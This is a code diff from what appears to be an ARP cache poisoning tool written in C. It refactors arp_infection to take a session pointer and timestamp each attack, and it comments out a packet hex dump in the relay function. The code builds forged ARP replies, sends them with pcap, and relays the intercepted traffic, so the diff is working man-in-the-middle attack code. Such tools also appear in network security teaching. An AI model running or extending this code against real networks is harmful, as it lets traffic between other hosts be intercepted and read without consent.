@@ -150,23 +150,24 @@ void get_mac_addr(uint8_t *ip_addr)
 	printf("\n");
 }
 
-void arp_infection(session s)
+void arp_infection(session *s)
 {
 	u_char send_pkt[50];
 
-	make_arp(send_pkt, my_mac, ip2mac[s.send_ip], 
-		 ARP_REPLY, my_mac, (uint8_t*)&s.tar_ip, 
-		 ip2mac[s.send_ip], (uint8_t*)&s.send_ip);
+	make_arp(send_pkt, my_mac, ip2mac[s->send_ip], 
+		 ARP_REPLY, my_mac, (uint8_t*)&s->tar_ip, 
+		 ip2mac[s->send_ip], (uint8_t*)&s->send_ip);
 	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);
+	s->last = time(NULL);
 
 	printf("[+] Attacked Session : ");
-	print_ip((uint8_t*)&s.send_ip);
+	print_ip((uint8_t*)&s->send_ip);
 	printf("(");
-	print_mac(ip2mac[s.send_ip]);
+	print_mac(ip2mac[s->send_ip]);
 	printf(") -> ");
-	print_ip((uint8_t*)&s.tar_ip);
+	print_ip((uint8_t*)&s->tar_ip);
 	printf("(");
-	print_mac(ip2mac[s.tar_ip]);
+	print_mac(ip2mac[s->tar_ip]);
 	printf(")\n");
 	printf("====================================\n");
 }
@@ -185,13 +186,14 @@ void pkt_relay(const u_char *pkt, uint32_t len, session s)
 	printf(" to ");
 	print_mac(ip2mac[s.tar_ip]);
 	printf("\n");
-
+/*
 	for(int i = 0; i < 5; i++)
 	{
 		for(int j = 0; j < 16; j++)
 			printf("%02x ", pkt[i * 16 + j]);
 		printf("\n");
 	}
+*/
 	printf("====================================\n");
 }
 
